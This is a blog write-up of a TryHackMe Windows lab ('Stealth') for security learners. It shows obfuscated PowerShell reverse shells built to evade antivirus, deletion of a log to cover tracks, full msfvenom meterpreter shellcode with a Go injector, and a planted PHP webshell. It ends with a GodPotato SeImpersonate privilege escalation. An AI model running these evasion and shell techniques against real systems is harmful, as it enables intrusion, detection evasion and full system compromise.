---
layout: post
title: THM Stealth Writeup  
subtitle: Medium Windows Box
tags: [THM]
---

| Name | Stealth |
| :------ |:--- |
| OS | Windows |
| DIFFICULTY | Medium |

[https://tryhackme.com/room/stealth](https://tryhackme.com/room/stealth)

## Recon
The 'lore' on this machine says to go to its IP on port `8080`. On the page it advertises a "PowerShell Script Analyzer."  

![Stealth](https://raw.githubusercontent.com/0xZon/0xZon.github.io/main/assets/img/stealth/1.png)


For an initial benign test, I created a `whoami.ps1` file containing a simple PowerShell command to display the executing user:
```
[System.Security.Principal.WindowsIdentity]::GetCurrent().Name
```

Although the application indicated that the code seemed fine, there was no output. Given the application's "Dev" mode status, as shown on the homepage screenshot, the lack of output might be due to the development environment.

Moving on to a more assertive test, I downloaded a PowerShell script from Nishang, designed to establish a reverse shell connection. Despite uploading the script and initiating a netcat listener, no callback was received. A probable cause could be Windows Defender or AMSI detecting and blocking the malicious script.

To counteract this, I opted for an anti-virus evasion approach using [this repository](https://github.com/deeexcee-io/PowerShell-Reverse-Shell-Generator) to generate an obfuscated payload for a reverse shell.

After downloading and running the obfuscator, the generated PowerShell script was uploaded. This time, a successful connection was established, confirming that the obfuscated payload bypassed the defenses.
```
wget https://raw.githubusercontent.com/deeexcee-io/PowerShell-Reverse-Shell-Generator/main/PowerShell-Obfuscator.py 

python3 PowerShell-Obfuscator.py
```

The resulting `payload.ps1` file, when uploaded and executed, successfully triggered a reverse shell, providing access to the target system.
```
nc -lvnp 9001
```

Now, with an established shell, further exploration and exploitation avenues can be pursued on the compromised system.

## User Flag
Upon gaining shell access, my immediate focus was on retrieving the user flag. However, I encountered a challenge – the flag was encoded. Examining its contents, I noticed an unconventional certificate-like structure, resembling base64-encoded text:
```
<:KDPaLlDXG4:> C:\Users\evader\Desktop> type encodedflag
-----BEGIN CERTIFICATE-----
WW91IGNhbiBnZXQgdGhlIGZsYWcgYnkgdmlzaXRpbmcgdGhlIGxpbmsgaHR0cDov
LzxJUF9PRl9USElTX1BDPjo4MDAwL2FzZGFzZGFkYXNkamFramRuc2Rmc2Rmcy5w
aHA=
-----END CERTIFICATE-----

```

Decoding it revealed instructions on obtaining the user flag, directing me to a specific URL:
```
┌──(kali㉿kali)-[~/thm]
└─$ echo -n 'WW91IGNhbiBnZXQgdGhlIGZsYWcgYnkgdmlzaXRpbmcgdGhlIGxpbmsgaHR0cDov
LzxJUF9PRl9USElTX1BDPjo4MDAwL2FzZGFzZGFkYXNkamFramRuc2Rmc2Rmcy5w
aHA=' | base64 -d
You can get the flag by visiting the link http://<IP_OF_THIS_PC>:8000/asdasdadasdjakjdnsdfsdfs.php
```

Upon visiting the provided URL, I encountered a message indicating that the "blue team has been alerted" and advising me to remove a log file.

![Stealth](https://raw.githubusercontent.com/0xZon/0xZon.github.io/main/assets/img/stealth/3.png)

Taking a closer look in the web root, I discovered a directory containing all my uploads, including the suspect log file. I removed `log.txt` like the web paged hinted it
```
<:KDPaLlDXG4:> C:\xampp\htdocs\uploads> dir


    Directory: C:\xampp\htdocs\uploads


Mode                LastWriteTime         Length Name                                             
----                -------------         ------ ----                                             
-a----         8/1/2023   5:10 PM            132 hello.ps1                                        
-a----        8/17/2023   4:58 AM              0 index.php                                        
-a----         1/3/2024   3:03 AM           1748 Invoke-PowerShellTcpOneLine.ps1                  
-a----         1/3/2024   3:05 AM            319 log.txt                                          
-a----         1/3/2024   3:05 AM            696 payload.ps1                                      
-a----         9/4/2023   3:18 PM            771 vulnerable.ps1                                   
-a----         1/3/2024   2:44 AM             63 whoami.ps1                                       


<:KDPaLlDXG4:> C:\xampp\htdocs\uploads> del log.txt

```

With the log file removed, revisiting the URL finally revealed the elusive user flag. This rather unconventional approach showcased the importance of stealth and covering one's tracks during a penetration test. This did not feel very real world to me, but it captured the idea of cleaning up after yourself. Going a step further I would delete my payloads as well if this was real world. 

![Stealth](https://raw.githubusercontent.com/0xZon/0xZon.github.io/main/assets/img/stealth/4.png)


## Stable Shell
With the user flag secured, the path to obtaining root access becomes significantly smoother with a more robust shell. To bypass Windows Defender, I opted for a shellcode injection technique using the [go-inject](https://github.com/zaneGittins/go-inject/tree/master) repository by Zane Gittins. Here's a step-by-step guide:

Clone the repository:
```
git clone https://github.com/zaneGittins/go-inject.git
```

Generate the shellcode using `msfvenom` (ensure to replace LHOST and LPORT):
```
┌──(kali㉿kali)-[~/thm/stealth/go-inject]
└─$ msfvenom -p windows/x64/meterpreter/reverse_tcp AUTOLOADSTDAPI=false LHOST=10.2.57.149 LPORT=9002 -f hex
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 510 bytes
Final size of hex file: 1020 bytes
fc4883e4f0e8cc0000004151415052514831d265488b526056488b5218488b5220488b72504d31c9480fb74a4a4831c0ac3c617c022c2041c1c90d4101c1e2ed52488b522041518b423c4801d0668178180b020f85720000008b80880000004885c074674801d0448b40208b48184901d050e3564d31c948ffc9418b34884801d64831c0ac41c1c90d4101c138e075f14c034c24084539d175d858448b40244901d066418b0c48448b401c4901d0418b0488415841584801d05e595a41584159415a4883ec204152ffe05841595a488b12e94bffffff5d49be7773325f3332000041564989e64881eca00100004989e549bc0200232a0a02399541544989e44c89f141ba4c772607ffd54c89ea68010100005941ba29806b00ffd56a0a415e50504d31c94d31c048ffc04889c248ffc04889c141baea0fdfe0ffd54889c76a1041584c89e24889f941ba99a57461ffd585c0740a49ffce75e5e8930000004883ec104889e24d31c96a0441584889f941ba02d9c85fffd583f8007e554883c4205e89f66a404159680010000041584889f24831c941ba58a453e5ffd54889c34989c74d31c94989f04889da4889f941ba02d9c85fffd583f8007d2858415759680040000041586a005a41ba0b2f0f30ffd5575941ba756e4d61ffd549ffcee93cffffff4801c34829c64885f675b441ffe7586a005949c7c2f0b5a256ffd5

```

Modify `examples/x64/valloc/valloc.go` in the cloned repository, replacing the hex string with the one generated by `msfvenom`.
```bash
cd go-inject
vim examples/x64/valloc/valloc.go
```

Build the injected binary
```
env GOOS=windows go build -ldflags="-s -w" -trimpath examples/x64/valloc/valloc.go
```

Configure the Metasploit console:
```
msf6 > use windows/x64/meterpreter/reverse_tcp
msf6 payload(windows/x64/meterpreter/reverse_tcp) > set lhost 10.2.57.149
lhost => 10.2.57.149
msf6 payload(windows/x64/meterpreter/reverse_tcp) > set lport 9002
lport => 9002
msf6 payload(windows/x64/meterpreter/reverse_tcp) > exploit
[*] Payload Handler Started as Job 0

[*] Started reverse TCP handler on 10.2.57.149:9002 
```

Host the binary:
```
┌──(kali㉿kali)-[~/thm/stealth/go-inject]
└─$ python3 -m http.server 8080
Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
```

Download and execute the payload on the target system:
```
<:KlAlDlYJR8:> C:\> cd C:\Windows\Tasks
<:KlAlDlYJR8:> C:\Windows\Tasks> wget 10.2.57.149:8080/valloc.exe -o valloc.exe
<:KlAlDlYJR8:> C:\Windows\Tasks> .\valloc.exe
```

Check Metasploit for the opened session:
```
msf6 payload(windows/x64/meterpreter/reverse_tcp) > [*] Sending stage (200774 bytes) to 10.10.150.218
[*] Meterpreter session 1 opened (10.2.57.149:9002 -> 10.10.150.218:49905) at 2024-01-02 23:47:50 -0500
msf6 payload(windows/x64/meterpreter/reverse_tcp) > sessions

Active sessions
===============

  Id  Name  Type                     Information                       Connection
  --  ----  ----                     -----------                       ----------
  1         meterpreter x64/windows  HOSTEVASION\evader @ HOSTEVASION  10.2.57.149:9002 -> 10.10.150.218:49905 (10.10.150.218)

msf6 payload(windows/x64/meterpreter/reverse_tcp) > sessions -i 1
[*] Starting interaction with 1...

meterpreter > 

```

Now, with a stable and improved shell, the groundwork is laid for more effective privilege escalation and further exploration of the compromised system.

## Pivot To Root
Upon inspecting the privileges in the `C:\xampp\htdocs` directory, I observed that `BUILTIN\User` possesses full privileges over the web root, as indicated by the "F" flag in the ACL (Access Control List). Conveniently, our user is part of this group:
```
C:\xampp\htdocs>icacls .
icacls .
. BUILTIN\Users:(I)(OI)(CI)(F)
  NT AUTHORITY\SYSTEM:(I)(OI)(CI)(F)
  BUILTIN\Administrators:(I)(OI)(CI)(F)
  CREATOR OWNER:(I)(OI)(CI)(IO)(F)
```

Notably, xampp installations on Windows grant the user or service account running the service the `SeImpersonate` privilege, a potent permission that can lead to system access.

To verify this, I uploaded the [wwwolf-php-webshell](https://github.com/WhiteWinterWolf/wwwolf-php-webshell) to the root directory, revealing that I indeed had `SeImpersonate` when executing commands through the webshell with service privileges. It was interesting as it was running as a user account rather than a service account, no matter we still had the privilege. 

Here's the step-by-step breakdown:

Download and host the webshell:
```bash
wget https://raw.githubusercontent.com/WhiteWinterWolf/wwwolf-php-webshell/master/webshell.php
python3 -m http.server 8080
```

Download the webshell to the web root:
```powershell
powershell.exe Invoke-WebRequest -URI http://10.2.57.149:8080/webshell.php -OutFile w.php
```

Accessing the webshell, confirm the `SeImpersonate` privilege
![Stealth](https://raw.githubusercontent.com/0xZon/0xZon.github.io/main/assets/img/stealth/5.png)

Utilizing this privilege, execute the same payload to gain a Meterpreter shell:
![Stealth](https://raw.githubusercontent.com/0xZon/0xZon.github.io/main/assets/img/stealth/6.png)

And I get a call back
```
[*] Sending stage (200774 bytes) to 10.10.150.218
[*] Meterpreter session 10 opened (10.2.57.149:9002 -> 10.10.150.218:49976) at 2024-01-03 00:31:24 -0500]

C:\xampp\htdocs>exit  
meterpreter > exit
msf6 payload(windows/x64/meterpreter/reverse_tcp) > sessions -i 10
[*] Starting interaction with 10...

meterpreter > shell

C:\Windows\Tasks>whoami /priv


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State    
============================= ========================================= ========
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled

```

With the elevated privileges, I employed [GodPotato net4](https://github.com/BeichenDream/GodPotato/releases/tag/V1.20) for privilege escalation. Following the same process of hosting and downloading as before, I ran the tool and successfully retrieved the root flag:
```bash
C:\xampp\htdocs\uploads>.\GodPotato-NET4.exe  -cmd "cmd /c type C:\Users\Administrator\Desktop\flag.txt"
```

A noteworthy observation during this box was the peculiar behavior of Windows Defender. It appeared to exhibit unusual activity in directories outside of `C:\xampp`. Suspecting the presence of an exclusion, I revisited the Defender settings after rooting the box. Indeed, my suspicion was validated. So if you have issues execute everything from `C:\xampp\htdocs\uploads`

```
*Evil-WinRM* PS C:\Users\Administrator\Documents> Get-MpPreference 
[snip]
ExclusionPath                                         : {C:\xampp}
```
